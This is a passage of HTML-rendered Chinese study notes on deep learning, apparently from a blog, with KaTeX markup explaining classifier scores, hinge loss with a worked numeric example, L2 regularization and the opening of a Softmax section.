encoding=\"application/x-tex\">10\\times3072</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">10</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">3072</span></span></span></span>, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span> 为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>10</mn><mo>×</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">10\\times1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">10</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span>, 最终结果为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>10</mn><mo>×</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">10\\times1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">10</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span>；<br />\n表示该图像分别对这 10 个分类的得分。</p>\n<p>深度学习其实就是在寻找最优的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span></p>\n<h3 id=\"损失函数\"><a class=\"anchor\" href=\"#损失函数\">#</a> 损失函数</h3>\n<p>衡量 <strong>分类的结果</strong> 和 <strong>真实情况</strong> 之间的差距。</p>\n<blockquote>\n<p>损失函数 = 数据损失 + 正则化惩罚项</p>\n</blockquote>\n<p><strong>数据损失</strong> (Data Loss)：数据 造成的损失</p>\n<p>例如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub><mo>=</mo><msub><mo>∑</mo><mrow><mi>j</mi><mo mathvariant=\"normal\">≠</mo><msub><mi>y</mi><mi>i</mi></msub></mrow></msub><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><msub><mi>s</mi><mi>j</mi></msub><mo>−</mo><msub><mi>s</mi><msub><mi>y</mi><mi>i</mi></msub></msub><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">L_{i}=\\sum_{j\\neq y_{i}}\\max(0,s_{j}-s_{y_{i}}+1)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1858em;vertical-align:-0.4358em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1864em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\"><span class=\"mrel mtight\"><span class=\"mord vbox mtight\"><span class=\"thinbox mtight\"><span class=\"rlap mtight\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"inner\"><span class=\"mord mtight\"><span class=\"mrel mtight\"></span></span></span><span class=\"fix\"></span></span></span></span></span><span class=\"mrel mtight\">=</span></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4358em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8694em;vertical-align:-0.2861em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:-0.0359em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span></span></span>，<br />\n其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示真实的分类结果</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706937929/Typera/2024/02/cf4e40c5c772f5369c4f595618b66d08.png\" alt=\"image-20240203132520467\" /></p>\n<p>则 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub><mo>=</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>5.1</mn><mo>−</mo><mn>3.2</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>+</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mo>−</mo><mn>1.7</mn><mo>−</mo><mn>3.2</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>=</mo><mn>2.9</mn></mrow><annotation encoding=\"application/x-tex\">L_1=\\max(0,5.1-3.2+1)+\\max(0,-1.7-3.2+1)=2.9</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">5.1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3.2</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">−</span><span class=\"mord\">1.7</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3.2</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">2.9</span></span></span></span><br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>2</mn></msub><mo>=</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>1.3</mn><mo>−</mo><mn>4.9</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>+</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>2</mn><mo>−</mo><mn>4.9</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">L_2=\\max(0,1.3-4.9+1)+\\max(0,2-4.9+1)=0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">1.3</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">4.9</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">4.9</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">0</span></span></span></span><br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>3</mn></msub><mo>=</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>2.2</mn><mo>+</mo><mn>3.1</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>+</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>2.5</mn><mo>+</mo><mn>3.1</mn><mo>+</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mo>=</mo><mn>10.9</mn></mrow><annotation encoding=\"application/x-tex\">L_3=\\max(0,2.2+3.1+1)+\\max(0,2.5+3.1+1)=10.9</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">2.2</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3.1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">2.5</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">3.1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">10.9</span></span></span></span></p>\n<p><strong>正则化惩罚项</strong>：权重参数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 造成的损失（与数据无关）<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>λ</mi><mi>R</mi><mo stretchy=\"false\">(</mo><mi>W</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>λ</mi><msub><mo>∑</mo><mi>k</mi></msub><msub><mo>∑</mo><mi>l</mi></msub><msubsup><mi>W</mi><mrow><mi>k</mi><mo separator=\"true\">,</mo><mi>l</mi></mrow><mn>2</mn></msubsup></mrow><annotation encoding=\"application/x-tex\">\\lambda R(W)=\\lambda \\sum_k\\sum_l W_{k,l}^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2333em;vertical-align:-0.4192em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1864em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1864em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4169em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.01968em;\">l</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4192em;\"><span></span></span></span></span></span></span></span></span></span>，<br />\n其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>λ</mi></mrow><annotation encoding=\"application/x-tex\">\\lambda</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">λ</span></span></span></span> 为惩罚系数，越大表示越不希望发生过拟合</p>\n<blockquote>\n<p>Softmax 分类器</p>\n</blockquote>\n<p>（分类问题，因为要的是概率值）</p>\n<p>由 <strong>得分值</strong> 获得 <strong>概率值</strong>，再将其转化为 <strong>损失值</strong></p>\n<ol>\n<li>放大 得分值之间的 差异 ：(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding=\"application/x-tex\">e^x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6644em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6644em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">x</span></span></span></span></span></span></span></span></span></span></span>)</li>\n<li>归一化： (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mo>=</mo><mi>k</mi><mi mathvariant=\"normal\">∣</mi><mi>X</mi><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>s</mi><mi>k</mi></msub></msup><mrow><msub><mo>∑</mo><mi>j</mi></msub><msup><mi>e</mi><msub><mi>s</mi><mi>j</mi></msub></msup></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">{P(Y=k|X=x_{i})=\\frac{e^{s_{k}}}{\\sum_{j}e^{s_{j}}}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.5885em;vertical-align:-0.6775em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span 